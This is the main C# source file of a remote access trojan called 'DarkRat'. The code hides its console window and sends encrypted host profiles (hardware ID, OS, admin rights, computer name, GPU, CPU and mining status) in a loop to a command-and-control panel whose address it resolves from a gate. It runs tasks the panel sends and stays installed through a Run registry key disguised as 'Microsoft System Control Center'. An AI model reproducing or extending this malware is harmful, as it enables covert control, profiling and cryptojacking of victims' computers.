using System;
using System.Text;
using Microsoft.Win32;
using System.Threading;
using DarkRat.Classes;
using System.Runtime.InteropServices;

namespace DarkRat
{
    // 
    // Dear maintainer:
    // 
    // Once you are done trying to 'optimize' this routine,
    // and have realized what a terrible mistake that was,
    // please increment the following counter as a warning
    // to the next guy:
    // 
    // total_hours_wasted_here = 50
    // 


    class Program
    {
        public static Thread s;
        static int SW_SHOW = 5;
        static int SW_HIDE = 0;


 
        static void Main(string[] args)
        {


            if (Settings.display == "True")
            {
                IntPtr myWindow = GetConsoleWindow();
                ShowWindow(myWindow, SW_HIDE);
            }
       

            Thread x = new Thread(new ThreadStart(mainthread));
            x.Start();

            if (Settings.Startup == "True")
            {
                s = new Thread(new ThreadStart(startthread));
                s.Start();
            }
        
            
        }

        private static void mainthread()
        {

            string id = Identification.getHardwareID();
            do
            {
                try
                {
                    string os = Identification.osName();

                    string pv = null;
                    if (Misc.isAdmin())
                    {
                        pv = "Admin";
                    }
                    else
                    {
                        pv = "User";
                    }
                    string ip = Misc.getLocation();
                    string cn = new Microsoft.VisualBasic.Devices.Computer().Name;
                    string lr = Misc.lastReboot();
                    string par = "id=" + Communication.encrypt(id) + "&os=" + Communication.encrypt(os) + "&pv=" + Communication.encrypt(pv) + "&ip=" + Communication.encrypt(ip) + "&cn=" + Communication.encrypt(cn) + "&lr=" + Communication.encrypt(lr) + "&ct=" + Communication.encrypt(Settings.ctask) + "&bv=" + Communication.encrypt(Settings.botv) + "&gpu="+ Communication.encrypt(Identification.videoId()) + "&cpu=" + Communication.encrypt(Identification.cpuId()) + "&ms=" + Communication.encrypt(Identification.Minningstatus()) + "&msgpu=" + Communication.encrypt(Identification.Minningstatusgpu())+ "&spkey="+ Communication.encrypt(Settings.spkey);
                    string panelurl =Communication.getGate();

                    if (Settings.debug == "True")
                    {
                        Console.WriteLine("Pastebin Response Gate: " + panelurl);
                    }
                  
                    string response = Communication.decrypt(Communication.makeRequest(panelurl, par));
                    if (Settings.debug == "True")
                    {
                        Console.WriteLine("Gate Task Response: " + response);
                    }
     

                    if (response != "rqf")
                    {
                        if (response.Contains("newtask"))
                        {
                            // process new task
                            string[] sps = response.Split(':');

                            string tid = sps[1];
                            if (tid != Settings.ctask)
                            {
                                Settings.ctask = tid;
                                if (Misc.processTask(sps[2], sps[3]))
                                {
                                    // notify panel that task has completed
                                    Communication.makeRequest(panelurl, par + "&op=" + Communication.encrypt("1") + "&td=" + Communication.encrypt(tid));
                                    if (Encoding.UTF8.GetString(Convert.FromBase64String(sps[2])) == "10" || Encoding.UTF8.GetString(Convert.FromBase64String(sps[2])) == "9")
                                    {
                                        Communication.makeRequest(panelurl, par + "&uni=" + Communication.encrypt("1"));
                                        Environment.Exit(0);
                                    }
                                }
                            }
                        }
                    }

        

                   
                }
                catch {
                    if (Settings.debug == "True")
                    {
                        Console.WriteLine("next Try");
                    }
                }
                           if (Settings.reqintervalType == "minutes")
                    {
                        Thread.Sleep(Int32.Parse(Settings.reqinterval) * 60000); // reqinterval * 1000 = seconds, reqinterval * 60000 = minutes
                    }
                    else
                    {
                        Thread.Sleep(Int32.Parse(Settings.reqinterval) * 1000);
                    }
            } while (true);
        }

        // adds the application to startup, with persistence
        private static void startthread()
        {
            do
            {
                // we wrap this in a try catch block to avoid errors with already existing keys / values
                try
                {
                    if (!Misc.keyExists("Microsoft System Control Center"))
                    {
                        RegistryKey reg = Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run", true);
                        reg.SetValue("Microsoft System Control Center", "\"" + Misc.getLocation() + "\"", RegistryValueKind.String);
                    }
                }
                catch { } 
                Thread.Sleep(3000);
            } while (true);
        }
        [DllImport("user32.dll")]
        static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
        [DllImport("kernel32.dll")]
        static extern IntPtr GetConsoleWindow();

    }

}
